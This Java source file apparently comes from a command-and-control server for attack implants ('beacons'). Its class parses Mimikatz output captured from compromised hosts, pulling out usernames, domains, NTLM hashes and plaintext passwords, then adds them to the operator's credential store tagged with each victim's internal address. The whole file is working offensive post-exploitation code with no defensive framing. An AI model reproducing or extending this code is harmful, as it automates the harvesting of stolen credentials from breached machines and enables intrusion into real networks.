package parser;

import common.BeaconEntry;
import common.CommonUtils;
import server.Resources;
import server.ServerUtils;

import java.util.HashMap;

public class MimikatzCredentials
        extends Parser {
    public MimikatzCredentials(Resources r) {
        super(r);
    }

    @Override
    public boolean check(String text, int type) {
        return this.isOutput(type) && text.contains("\nAuthentication Id");
    }

    @Override
    public void parse(String text, String bid) {
        HashMap hashes = new HashMap();
        HashMap creds = new HashMap();
        String user = "";
        String domain = "";
        long logon = 0L;
        BeaconEntry entry = ServerUtils.getBeacon(this.resources, bid);
        if (entry == null) {
            return;
        }
        text = CommonUtils.strrep(text, "\r", "");
        String[] lines = text.split("\n");
        for (String original : lines) {
            int index = original.indexOf(":");
            if (index <= 0 || index + 1 >= original.length()) continue;
            String key = original.substring(0, index);
            String value = original.substring(index + 1);
            key = CommonUtils.strrep(key, " ", "");
            key = CommonUtils.strrep(key, "\t", "");
            if ("(null)".equals(value = value.trim())) continue;
            if ("*Username".equals(key)) {
                user = value;
                continue;
            }
            if ("User Name".equals(key)) {
                user = value;
                continue;
            }
            if ("*Domain".equals(key)) {
                domain = value;
                continue;
            }
            if ("Domain".equals(key)) {
                domain = value;
                continue;
            }
            if ("*NTLM".equals(key) && !user.endsWith("$") && !"".equals(user)) {
                ServerUtils.addCredential(this.resources, user, value, domain, "mimikatz", entry.getInternal(), logon);
                continue;
            }
            if (!"*Password".equals(key) || user.endsWith("$") || "".equals(user)) continue;
            ServerUtils.addCredential(this.resources, user, value, domain, "mimikatz", entry.getInternal(), logon);
        }
        this.resources.call("credentials.push");
    }
}

